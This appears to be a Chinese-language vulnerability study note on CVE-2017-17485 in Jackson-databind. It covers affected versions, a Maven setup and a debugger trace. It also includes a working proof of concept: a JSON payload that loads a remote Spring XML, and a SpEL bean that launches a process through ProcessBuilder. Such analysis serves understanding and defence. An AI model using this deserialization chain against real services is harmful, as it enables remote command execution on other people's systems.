

# CVE-2017-17485

## 前言

本次Jackson反序列化漏洞是基于org.springframework.context.support.ClassPathXmlApplicationContext的利用链的。在开启enableDefaultTyping()或使用有问题的@JsonTypeInfo注解的前提下，可以通过jackson-databind来滥用Spring的SpEL表达式注入漏洞来触发Jackson反序列化漏洞的，从而达到任意命令执行的效果。



> 该利用链与TemplatesImpl利用链不同的时,那条利用链利用的是json反序列化时会调用setter,getter的特性,来触发badGet,但是这条链子用的是另一条特性,反序列化时可以触发有参数的构造方法。

一个小例子:

```java
package ApplicationContext;

public class Another {
    public Object object;
}
```

```java
package ApplicationContext;

public class class2 {

    class2(){
        System.out.println("non-parameter constructor");
    };
    class2(String a){
        System.out.println("String-parameter constructor!!!\nString Value = "+a);
    };

}
```

```java
package ApplicationContext;

import com.fasterxml.jackson.databind.ObjectMapper;

public class readValue {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json="{\"object\":[\"ApplicationContext.class2\",{}]}";//
        Object aaa=mapper.readValue(json,Another.class);
        System.out.println("-------------------------------------");
        String json2="{\"object\":[\"ApplicationContext.class2\",\"SUCCESS!!!\"]}";//
        Object cl2 = mapper.readValue(json2, Another.class);  //反序列化
    }
}
```

输出:

![image-20211028224536412](ClassPathXmlApplicationContext/image-20211028224536412.png)

可以看到我们的构造方法被调用,我又想到Yaml反序列化漏洞触发链中就是有调用一个可以控制参数的构造方法从而触发的漏洞。这里不知道是否也适用。有时间的话可以自己测试一下。

## 影响版本

Jackson 2.7系列 < 2.7.9.2

Jackson 2.8系列 < 2.8.11

Jackson 2.9系列 < 2.9.4

## 环境搭建

pom.xml:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>org.example</groupId>
  <artifactId>[IDEA]fastjson</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>[IDEA]fastjson</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <dependencies>
    <dependency>
      <groupId>com.fasterxml.jackson.core</groupId>
      <artifactId>jackson-databind</artifactId>
      <version>2.7.9</version>
    </dependency>

    <!-- https://mvnrepository.com/artifact/org.springframework/spring-context -->
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-context</artifactId>
      <version>5.0.2.RELEASE</version>
    </dependency>

    <!-- https://mvnrepository.com/artifact/org.springframework/spring-expression -->
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-expression</artifactId>
      <version>5.0.2.RELEASE</version>
    </dependency>

  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>

      </plugins>
    </pluginManagement>
  </build>
</project>
```

Spel.xml:

```java
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg value="calc.exe" />
        <property name="whatever" value="#{ pb.start() }"/>
    </bean>
</beans>
```

Poc:

```java
package ApplicationContext;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

public class POC {
    public static void main(String[] args)  {
        //CVE-2017-17485

        String payload = "{\"object\":[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:8000/spel.xml\"]}";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
            mapper.readValue(payload, Another.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```



## 流程分析

分两个部分,第一个部分是如何调用我们的带参Constructor,第二个部分则是如何触发我们的命令执行的,这后面呢实际上是一个spel表达式注入

### 第一部分

调用BeanDeserializer来解析![image-20211029153648747](ClassPathXmlApplicationContext/image-20211029153648747.png)

![image-20211029153702817](ClassPathXmlApplicationContext/image-20211029153702817.png)

![image-20211029153720048](ClassPathXmlApplicationContext/image-20211029153720048.png)

我们的object值是一个数组,调用`AsArrayTypeDeserializer`来解析该数组

![image-20211029153945705](ClassPathXmlApplicationContext/image-20211029153945705.png)

![image-20211029154010454](ClassPathXmlApplicationContext/image-20211029154010454.png)

然后调用BeanDeserializer来解析value

![image-20211029154411309](ClassPathXmlApplicationContext/image-20211029154411309.png)

![image-20211029154544722](ClassPathXmlApplicationContext/image-20211029154544722.png)

![image-20211029154554525](ClassPathXmlApplicationContext/image-20211029154554525.png)

![image-20211029154605597](ClassPathXmlApplicationContext/image-20211029154605597.png)

跟进`creatFromString`,这的`_fromStringCreator`为一个`AnnotatedConstructor`

![image-20211029154724214](ClassPathXmlApplicationContext/image-20211029154724214.png)

接着就是通过反射进行实例化,这里可以看见我们的arg为构造函数的参数

![image-20211029154829051](ClassPathXmlApplicationContext/image-20211029154829051.png)

### 第二部分

来到了构造函数,这里有一个refresh()方法,这里是存在一个SpEL表达式注入的,

![image-20211029154956422](ClassPathXmlApplicationContext/image-20211029154956422.png)

这个beaFactory中包含了从我们的url中获取的信息

![image-20211029155939929](ClassPathXmlApplicationContext/image-20211029155939929.png)

invokeBeanFactoryPostProcessors()函数中调用了getBeanNamesForType()函数来获取Bean名类型：

![image-20211029160150672](ClassPathXmlApplicationContext/image-20211029160150672.png)![image-20211029160205990](ClassPathXmlApplicationContext/image-20211029160205990.png)

![image-20211029160223521](ClassPathXmlApplicationContext/image-20211029160223521.png)

上面通过beanName获取到了mbd,然后通过isFactoryBean()判断当前beanName是否为FactoryBean，此时beanName参数值为”pb”，mbd参数中识别到bean标签中的类为java.lang.ProcessBuilder：

![image-20211029160411486](ClassPathXmlApplicationContext/image-20211029160411486.png)

在isFactoryBean()函数中，调用predictBeanType()函数获取Bean类型：

![image-20211029160639361](ClassPathXmlApplicationContext/image-20211029160639361.png)

跟进去，predictBeanType()函数中通过调用determineTargetType()函数来预测Bean类型：

![image-20211029160828437](ClassPathXmlApplicationContext/image-20211029160828437.png)

上面应该也是利用类似缓存机制来尝试进行一个加载,然后进入AbstractBeanFactory.resolveBeanClass()

![image-20211029161105244](ClassPathXmlApplicationContext/image-20211029161105244.png)

AbstractBeanFactory.doResolveBeanClass()

![image-20211029161237567](ClassPathXmlApplicationContext/image-20211029161237567.png)

调用`evaluateBeanDefinitionString`对我们的bean进行一个解析,然后后面就是一个Spel表达式注入

![image-20211029161742814](ClassPathXmlApplicationContext/image-20211029161742814.png)











# 参考

https://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/